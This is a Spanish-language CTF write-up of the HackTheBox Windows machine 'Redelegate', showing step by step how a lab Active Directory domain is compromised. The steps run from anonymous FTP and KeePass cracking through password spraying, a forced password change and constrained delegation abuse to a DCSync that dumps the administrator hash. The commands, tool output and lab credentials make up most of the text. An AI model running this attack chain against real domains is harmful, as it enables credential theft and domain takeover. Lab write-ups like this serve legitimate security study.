---
layout: single
title: "Machines - Redelegate (HTB)"
author_profile: true
published: true
toc: true
toc_sticky: true
comments: true
---

Las máquinas (de HackTheBox) son retos gamificados enfocados a __Red Team__ o por lo menos, __seguridad ofensiva__, donde tendrás que intentar __tomar control total__ de la máquina que tengas adelante abusando de vulnerabilidades para Obtener un _Foothold_, y luego seguir con generalmente, _movimiento lateral_ y finalmente, la _escalada de privilegios_; Estos laboratorios son especialmente útiles para probar conceptos de seguridad ofensiva ya que tendrás que abusar de ellos para seguir avanzando.

![UTMP]({{ "/images/Redelegate/logo.png" | relative_url }}){: .align-center}

## Resumen Redelegate

Redelegate es una máquina Windows "Difícil" (Muchas de las partes son un poco directas) entre malas configuraciones de varias aplicaciones, uso de `Bloodhound` para abusar de privilegios para movernos lentamente hacia el DC, donde la mezcla de un usuario (con cierto privilegio) y un ACE sobre un objeto, hacen la receta perfecta para un `Constrained Delegation Attack`.

Para más detalles, podemos resumir/mencionar el trabajo en este flujo

1. __Escaneo Inicial__ Como siempre, `nmap` para empezar el día.
2. __Enumeración FTP y Bruteforce kdbx__ Encontramos una mala configuración de FTP y algunos de sus archivos nos dìrán la dirección de los tiros.
3. __Enumeración del entorno abusando acceso MSSQL__ Encontrando las credenciales de la base de datos de KeePass, enumeramos el entorno.
4. __Account TakeOver via ForceChangePassword__ Con los resultados de la enumeración, encontramos en primera, un usuario del que podremos aprovechar un _extended right_ sobre un usuario que puede conectarse al DC.
5. __Abuso GenericAll y SeEnableDelegationPrivilege__ Este usuario para nuestra sorpresa, tiene un permiso especìfico y también un privilegio con el que podremos formar un __Constrained Delegation__
6. __DCSync__ Una vez con la identidad robada, podemos hacer un `DCSync` con el que dumpearemos los hashes NT del dominio.

Como mencioné antes, el flujo es entretenido, pero lo realmente interesante es cómo se arma el __Constrained Delegation__, ojalá disfruten esta escalada como lo hice yo :p.

## Laboratorio

### Escaneo Inicial

Bien!, iniciemos con el escaneo tìpico de `nmap`, como siempre, de forma rápida, enumerando todos los puertos, guardándolo en un Grepeable, adelante la explicación a detalle:

```bash
nmap -p- --min-rate 5000 -n -Pn 10.129.234.50 -oG allports
```

* `-p-` Indica el escaneo de los 65,535 puertos
* `--min-rate 5000` Indica la velocidad de transmisión de paquetes (a una tasa mínima de 5,000 paquetes por segundo)
* `-n` Deshabilita la resolución DNS de la IP
* `-Pn` Deshabilita el reconocimiento con icmp que realiza `nmap` para determinar si el host está activo o no
* `10.10.11.82` La IP objetivo
* `-oG allports` Indica un archivo de salida en formato grepeable (facilita mucho el utilizar bash para la extracción de información del archivo)

```js
Not shown: 65058 filtered tcp ports (no-response), 468 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

Desde los resultados, podemos ir sospechando de un AD, la combinación del 53, 135, 139 y el 445 es lo más común encontrar en este tipo de máquinas; el puerto 3389 (RDP) no siempre se encuentra, pero, pues puede ser un protocolo de acceso bastante jugoso, pero necesitaremos las credenciales.

Bien, ahora con estos resultados, ejecutamos el segundo escaneo de `nmap` pero con los 'scrips por defecto' (que son varios scripts que realizan escaneos extras a cada uno de los servicios, bueno, dependiendo de los servicios) y la enumeración de versiones (Lo cual es bastante importante, qué tal que tenga alguna versión vulnerable y alcanzar NT AUTHORITY SYSTEM luego luego, nunca se sabe cuándo tocará).

```bash
nmap -p 21,53,80,135,139,445,1433,3389 -sCV -n -Pn 10.129.234.50 -oN OpenṔorts
```

* `-p21,53,80,135,139,445,3389` Limita el escaneo a los puertos que encontramos abiertos.
* `-sCV` Son 2 flags combinadas de nmap (-sC) para la ejecución de scripts por defecto de nmap (mayor información) y (-sV) para determinar la versión del servicio.
* `-oN OpenPorts` Indica que el output del comando lo reporte en un formato nmap, la salida de lo que veas en consola será lo que verás en el archivo.

Lo primero que veremos en el reporte será:

![UTMP]({{ "/images/Redelegate/ftp_anon.png" | relative_url }}){: .align-center}

### Enumeración FTP y Bruteforce kdbx

Un FTP Anonymous!, y con 3 archivitos; accedemos mediante ftp al servidor y utilizamos las credenciales del usuario anonimo: (recuerda __anonymous:<Empty>__)

![UTMP]({{ "/images/Redelegate/ftp_access.png" | relative_url }}){: .align-center}

Una vez dentro, puedes escargar con get, eso sì, revisa las alertas, especialmente cuando intentamos descargar un archivo binario como la base de datos de KeePass:

![UTMP]({{ "/images/Redelegate/ftp_warning.png" | relative_url }}){: .align-center}

Esto sucede por una única cosa, el __Line Feed y el Carriage Return__, que no es más que, cómo, internamente, se "escriben" los saltos de linea; en `Linux`, estos saltos son representados con el `\n` (El _Line Feed_), pero en windows, es representado por `\r\n` (el _CR_ y el _LF_). 

Cuando descargamos un archivo por `FTP`, el protocolo _supone_ que es un archivo de texto, entonces, para que se vea bien en Windows, le añade los saltos de linea utilizando el `\r\n`, pero esto especialmente afecta a los binarios (o zips, o jpgs o muchos más), que no contiene texto, sino datos puros (lo que lo corrompe).

Entonces, utilizamos el comando `binary` dentro de FTP para evitar este problema:

![UTMP]({{ "/images/Redelegate/ftp_binary.png" | relative_url }}){: .align-center}

Y no olvides descargar los otros dos archivos!


¿Qué sigue?, bueno, ese archivo `kdbx` es una caja fuerte de contraseñas, si tiene alguna débil, podremos leer los contenidos y seguramente, alguna cuenta. Además... Leyendo los archivos, mencionan algo que nos interesa:

![UTMP]({{ "/images/Redelegate/training.png" | relative_url }}){: .align-center}

Quizá demasiado directo, pero útil; entonces creamos nuestro pequeño diccionario con ese formato:

```js
SeasonYear!
Spring2025!
Winter2025!
Summer2025!
Fall2025!
Spring2024!
Winter2024!
Summer2024!
Fall2024!
Spring2023!
...
```

Y Utilizamos `keepass2john` (https://github.com/ivanmrsulja/keepass2john/blob/master/keepass2john.py):

```js
python keepass2john.py Shared.kdbx > output.hash
```

Y utilizando john, utilizamos nuestra lista para encontrar nuestra respuesta:

```js
john --format=keepass --wordlist=./list.txt output.hash
Shared<SHOULD_BE_REMOVED_INCLUDING_COLON>:Fall2024!
```

Luego, utilizamos `keepass2` para leer los contenidos (o en realidad, cualquier herramienta que pueda abrir el archivo):

![UTMP]({{ "/images/Redelegate/keepass.png" | relative_url }}){: .align-center}

Ya dentro, podemos acceder a las credenciales que querramos:

![UTMP]({{ "/images/Redelegate/kee_passwords.png" | relative_url }}){: .align-center}

Ahora, ya que tenemos credenciales, y jústamente `MSSQL` abierto, accedemos con la cuenta de _SQLGuest_ con `netexec` así que probamos el login por `mssql`

```js
❯ nxc mssql 10.129.234.50 -u SQLGuest -p zDPBpaF4FywlqIv11vii
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\SQLGuest:zDPBpaF4FywlqIv11vii (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
```

Esto sucede porque por defecto `netexec` intenta autenticarse o usando kerberos o NT (Es decir, utilizando métodos como si la cuenta estuviera dentro del dominio), pero a veces, esas cuentas son locales (Es decir, viven en la SAM de la máquina, no en el dominio en sí); Por ello, se utiliza el flag `--local-auth` que le indica a la máquina, _'Esta cuenta es local, verifícala en tu base de datos'_.

```js
❯ nxc mssql 10.129.234.50 -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii
```

### Enumeración del entorno abusando acceso MSSQL

Ahora, podemos enumerar varias cosas dentro de MSSQL, pero es un callejón sin salida; aquí lo que hacemos es hacer un bruteforce del `RID`:

El `RID` o _Relative Identifier_ es la pieza que identifica un usuario, grupo o computadora dentro de un dominio de AD; quizá en algún momento hayan visto algo parecido a esto:

```
S-1-5-21-3623811015-3361044348-30300820-1001
```

Este es un `SID` (_Security Identifier_), justo al final de este identificador, está el `RID`.

Hay 2 protocolos con los que podemos hacer bruteforce de `RID` (El programa pregunta uno por uno de los RIDs en el dominio y nos lista si existen (súmamente simplificado xd)): Con `SMB` (Pero en este caso no tenemos `SMB`) y con `MSSQL`:

```bash
❯ nxc mssql 10.129.234.50 -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth --rid-brute  
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
MSSQL       10.129.234.50   1433   DC               498: REDELEGATE\Enterprise Read-only Domain Controllers
MSSQL       10.129.234.50   1433   DC               500: WIN-Q13O908QBPG\Administrator
MSSQL       10.129.234.50   1433   DC               501: REDELEGATE\Guest
MSSQL       10.129.234.50   1433   DC               502: REDELEGATE\krbtgt
MSSQL       10.129.234.50   1433   DC               512: REDELEGATE\Domain Admins
....
MSSQL       10.129.234.50   1433   DC               1104: REDELEGATE\Christine.Flanders
MSSQL       10.129.234.50   1433   DC               1105: REDELEGATE\Marie.Curie
MSSQL       10.129.234.50   1433   DC               1106: REDELEGATE\Helen.Frost
....
```

Bien, aquí identificamos las cuentas de usuario (las que tienen forma de cuentas de usuario haha), Como parece, tienen el formato __Nombre.Apellido__, aquí es donde entra la magia del scripting para limpiar la salida de `nxc` y quedarse sólo con las cuentas.

Con sólo las cuentas de usuario listadas en un diccionario, vamos a ver si alguna de ellas también tiene la mala costumbre de utilizar contraseñas débiles... como _SeasonYear!_:

```bash
❯ nxc smb 10.129.234.50 -u ./users -p ../content/list.txt

....
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 
```

Tarde o temprano obtendremos ese hit, un usuario con contraseña débil; ahora que tenemos acceso por `SMB` ya podemos autenticarnos por `ldap` enumerar para bloodhound:

```bash
❯ nxc ldap 10.129.234.50 -u Marie.Curie -p Fall2024! --bloodhound --collection All
```

Cuando haya terminado, importamos los resultados a `bloodhound` y buscamos usuarios con privilegios "interesantes"

Lo que a mi me gusta hacer, es una forma muy bruta: Busco el nodo que controlo y lo añado a `owned`

![UTMP]({{ "/images/Redelegate/owned.png" | relative_url }}){: .align-center}

Como tutorial de youtube del 2015, "yo ya lo hice, pero a ustedes les saldrá que no".

Y bueno, buscar en el __Outbound Object Control__ qué control se supone que tenemos:

![UTMP]({{ "/images/Redelegate/outboundcontrol.png" | relative_url }}){: .align-center}

En la imagen se ve el pequeño spoiler; pero entendamos: _Marie.Curie_ tiene privilegios extendidos por su membership al grupo _Helpdesk_ ahora, ¿Qué contraseña cambiamos? Pues la que más nos convenga básicamente; tenemos que repetir el proceso de qué permisos tiene cada uno de los usuarios...

Les adelanto que _Helen.Frost_ tiene de los más importantes: Si observamos de qué es miembro, nos encontramos con:

![UTMP]({{ "/images/Redelegate/remote_management.png" | relative_url }}){: .align-center}

Que es miembro de __Remote Management Users__, abriendo la vía potencial de que nos permita el acceso al DC mediante `winrm`

### Account TakeOver via ForceChangePassword

¿Cómo tomamos la cuenta?, pues muy fácil en realidad, hasta bloodhound nos ayuda con eso (sólo le damos click a __ForceChangePassword__):

![UTMP]({{ "/images/Redelegate/help_takeover.png" | relative_url }}){: .align-center}

Tal y como nos dice; podemos utilizar `net` para cambiar la contraseña:

```js
net rpc password "helen.frost" "P@SsWord0" -U "Redelegate.vl"/"marie.curie"%"Fall2024!" -S "10.129.234.50"
```

No vemos salida, lo cual es bueno, y probamos las credenciales nuevas...

```js
❯ nxc smb 10.129.234.50 -u helen.frost -p P@SsWord0                                                          
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\helen.frost:P@SsWord0
```

Confirmadas!, podemos utilizar `Evil-WinRM` y entrar a la máquina.

```js
❯ evil-winrm -u helen.frost -p P@SsWord0 -i 10.129.234.50
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents>
```

Hermoso!. 

Ahora, lo primero, es revisar qué privilegios tiene nuestro usuario; para eso utilizamos el tìpico `whoami /priv`:

```js
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

### Abuso GenericAll y SeEnableDelegationPrivilege

Esta salida es muy especial; el privilegio `SeEnableDelegationPrivilege` es uno que normalmente, sólo está disponible para los Administradores; ¿Qué hace?: 

_El privilegio SeDelegationPrivilege (conocido en la interfaz de Windows como "Habilitar que las cuentas de equipo y de usuario tengan confianza para la delegación") ... En pocas palabras, permite que un usuario o equipo suplante a otros usuarios ante servicios de red._

Cuando tú te autenticas ante un servidor o Servicio, ese servidor sabe quién eres (pues, te autenticaste), pero... No puede usar tu identidad para entrar a un segundo servidor o servicio; este privilegio rompe esta limitante; Con el permiso, puedes permitir guardar las credenciales de un cliente y reenviarla a otro servicio como si fuera el original.

Esto tiene varios usos, como por ejemplo, permitir a un proceso a acceder a recursos de red en nombre del usuario que inició sesión

Pero... Esto puede ser abusado para:

* Forzar a cualquier usuario que se conecte a entregar su `TGT` y luego robar el ticket (__Unconstrained Delegation__)
* Generar un ticket de servicio en nombre de cualquier usuario hacia un servicio especìfico permitido (__Constrained Delegation__)

(Hay otra pero esta depende más de tener o `GenericWrite`, `GenericAll` o `WriteProperty`: en la cual, tu objetivo es configurar a un equipo/objeto para confiar en una cuenta para realizar delegaciones, lo que permite suplantar cualquier cuenta sobre el equipo (__Resource Based Constrained Delegation__)).

Bien, ahora nos falta una pieza en el rompecabezas, revisemos `Bloodhound`:


![UTMP]({{ "/images/Redelegate/genericall.png" | relative_url }}){: .align-center}

Tenemos `GenericAll` sobre __FS01.REDELEGATE.VL__!, Esto nos otorga control total sobre este equipo, entonces... podemos utilizar ambos ingredientes para:

1. Agregar un atributo a la máquina controlada (abusando de `GenericAll`)
2. Utilizar el privilegio `SeEnableDelegationPrivilege` para agregar una entrada en el DC: permitir credenciales delegadas del equipo bajo control ante un serivico dentro del DC.
3. Pedir un ticket de servicio como el DC

Hagamos el flujo para entenderlo mejor:

Primero, agregamos el atributo `TRUSTED_TO_AUTH_FOR_DELEGATION` sobre __FS01__ (que es el equipo del que tenemos control), básicamente, estamos agregando una regla al equipo: _Yo equipo FS01, tengo permisos para confirmar que alguien se autenticó para una delegación_.

Para facilitarlo, pedimos el TGT de _helen.frost_:

```js
❯ getTGT.py -dc-ip 10.129.234.50 "redelegate.vl/helen.frost":"P@SsWord0"
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in helen.frost.ccache

❯ export KRB5CCNAME=helen.frost.ccache
```

Ahora, con el ticket guardado, podemos utilizar `Kerberos` para autenticarnos (`-k`)

```js
❯ bloodyAD -d redelegate.vl -k -i "10.129.234.50" -H "dc.redelegate.vl" add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

Luego, permitimos la delegación desde nuestro equipo controlado hacia __cifs/dc.redelegate.vl__ que básicamente estamos diciéndole al DC, permite la delegaión del equipo __FS01__ para el servicio __cifs__ del controlador del Dominio

```js
❯ bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" -i "10.129.234.50" set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

Ahora, cambiamos la contraseña del equipo bajo control para obtener la identidad de este (el TGT):

```js
❯ bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" -i "10.129.234.50" set password "FS01$" "P##SwORD1"                                    
[+] Password changed successfully!

❯ getTGT.py -dc-ip 10.129.234.50 "redelegate.vl/FS01$":"P##SwORD1"
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in FS01$.ccache

❯ export KRB5CCNAME=FS01\$.ccache 
```

Finalmente... Como nuestro equipo bajo control, es confiado para "confirmar" una autenticación de un usuario en su nombre, ante el servicio CIFS, podemos crear un ticket de servicio de cualquier cuenta!, como por ejemplo la del DC:

```js
❯ impacket-getST 'redelegate.vl/FS01$' -k -no-pass -spn "cifs/dc.redelegate.vl" -impersonate dc -dc-ip 10.129.20.120
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Impersonating dc
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in dc.ccache
```

### DCSync

Bien, ahora con el ticket, hacemos el dumping de los hashes del dominio con el _DCSync Attack_, primero, nos exportamos el ticket, y luego utilizamos `secretsdump.py`

```js
❯ took  6s export KRB5CCNAME=dc.ccache

❯ secretsdump.py -target-ip 10.129.20.120 -just-dc -just-dc-user Administrator -k -no-pass dc.redelegate.vl
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfc101b94ffc0a7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
[*] Cleaning up... 
```

Y, tan sencillo como hacer PtH con `evil-winrm`:

```js
❯ evil-winrm -H ec17f7a2a4d96e177bfc101b94ffc0a7 -u Administrator -i 10.129.20.120
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

PWNED!

###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

_En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!._

